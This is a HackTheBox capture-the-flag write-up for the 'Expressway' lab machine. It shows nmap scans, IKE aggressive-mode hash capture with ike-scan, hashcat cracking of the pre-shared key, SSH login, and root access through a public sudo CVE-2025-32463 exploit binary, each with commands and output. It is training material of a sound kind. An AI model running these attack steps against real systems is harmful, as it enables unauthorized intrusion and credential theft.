# **Expressway - HackTheBox**

*Target Ip. Address: 10.129.238.52*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.238.52
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-21 12:49 +0545
Nmap scan report for 10.129.238.52
Host is up (1.7s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.49 seconds
```

What !!! We only have 1 port. Let's do a udp scan.

```bash
kali@kali:nmap -sU -Pn 10.129.238.52
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-21 12:55 +0545
Nmap scan report for 10.129.238.52
Host is up (2.2s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 1146.36 seconds
```

That took a lot of time. We have isakmp open. That's huge. ISAKMP (Internet Security Association and Key Management Protocol) manages IPsec VPN negotiations and can leak sensitive vendor/version fingerprints or authentication hashes (especially in Aggressive Mode) which can be captured and brute-forced offline to gain unauthorized network access.

```bash
kali@kali:ike-scan -A 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned HDR=(CKY-R=9591716b4acab724) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 1.762 seconds (0.57 hosts/sec).  1 returned handshake; 0 returned notify
```

We have a user value: ike@expressway.htb. Let's enumerate further with this found username.

Before that add expressway.htb on /etc/hosts.

```bash
kali@kali:cat /etc/hosts
10.129.238.52   expressway.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Now, we are ready to enumerate.

```bash
kali@kali:ike-scan -A --id=ike@expressway.htb -Ppresharedkey.txt 10.129.238.52                                                                                     
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned HDR=(CKY-R=0c97aef3682dad3e) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.579 seconds (1.73 hosts/sec).  1 returned handshake; 0 returned notify
```

The successful Aggressive Mode handshake on 10.129.238.52 reveals that the target is using 3DES/SHA1 encryption and has returned a PSK hash for the identity ike@expressway.htb, which can now be saved and cracked offline using a tool like hashcat or john.

```bash
kali@kali:cat presharedkey.txt
2843c7b2c2f.....30d7bfd538533b7
```

Let's crack it using hashcat mode 5400.

```bash
kali@kali:hashcat -m 5400 presharedkey.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-penryn-12th Gen Intel(R) Core(TM) i7-1255U, 2853/5707 MB (1024 MB allocatable), 4MCU
.
.
.
2843c7b2c2f.....30d7bfd538533b7:fr.....ad
                                                        
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5400 (IKE-PSK SHA1)
Hash.Target......: 2843c7b2c2f10753ea8d3c8e63cec21b6c02560c96dd4f64787...8533b7
Time.Started.....: Sat Feb 21 13:26:04 2026 (7 secs)
Time.Estimated...: Sat Feb 21 13:26:11 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1065.2 kH/s (2.69ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8048640/14344385 (56.11%)
Rejected.........: 0/8048640 (0.00%)
Restore.Point....: 8044544/14344385 (56.08%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: freaky97 -> frankoelgorila
Hardware.Mon.#01.: Util: 38%

Started: Sat Feb 21 13:25:49 2026
Stopped: Sat Feb 21 13:26:13 2026
```

We successfully cracked the hash. Now, we can login via ssh with the credentials we have.

```bash
kali@kali:ssh ike@expressway.htb
The authenticity of host 'expressway.htb (10.129.238.52)' can't be established.
ED25519 key fingerprint is: SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'expressway.htb' (ED25519) to the list of known hosts.
ike@expressway.htb's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 21 07:44:14 2026 from 10.10.16.46
ike@expressway:~$
```

We are in. We get our first flag in home directory.

```bash
ike@expressway:~$ cat user.txt
6e.....0f
```

We have no sudo permissions, no SUID. But we have a critical find.

```bash
ike@expressway:~$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Sudo version 1.9.17 is potentially vulnerable to a local privilege escalation flaw (CVE-2025-32463) involving the SUDO_EDITOR environment variable, and the exploit can be found here: "*https://github.com/r3dBust3r/CVE-2025-32463*"

Make the exploit binary executable, and run the exploit.

```bash
ike@expressway:~$ chmod +x exploit
ike@expressway:~$ ./exploit


   _______    ________    ___  ____ ___   ______     ________  __ __  __________
  / ____/ |  / / ____/   |__ \/ __ \__ \ / ____/    |__  /__ \/ // / / ___/__  /
 / /    | | / / __/________/ / / / /_/ //___ \______ /_ <__/ / // /_/ __ \ /_ < 
/ /___  | |/ / /__/_____/ __/ /_/ / __/____/ /_____/__/ / __/__  __/ /_/ /__/ / 
\____/  |___/_____/    /____|____/____/_____/     /____/____/ /_/  \____/____/  

>> Sudo 1.9.14 -> 1.9.17 Local Privilege Escalation via chroot (CVE-2025-32463)
>> Script by @r3dBust3r
>> Exploit reference: https://www.exploit-db.com/exploits/52352

[  2026-02-21 07:48:49  ]

---

[*] a temporary directory created: /tmp/sudo.woot.MOzqYoCAR9O
[*] an exploit just landed: /tmp/sudo.woot.MOzqYoCAR9O/woot.c
[*] Compiling '/tmp/sudo.woot.MOzqYoCAR9O/woot.c'
[*] trying to get root access...
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

We are root. Let's end this challenge by reading the final flag at root directory.

```bash
root@expressway:/root# cat root.txt
2f.....0c
```
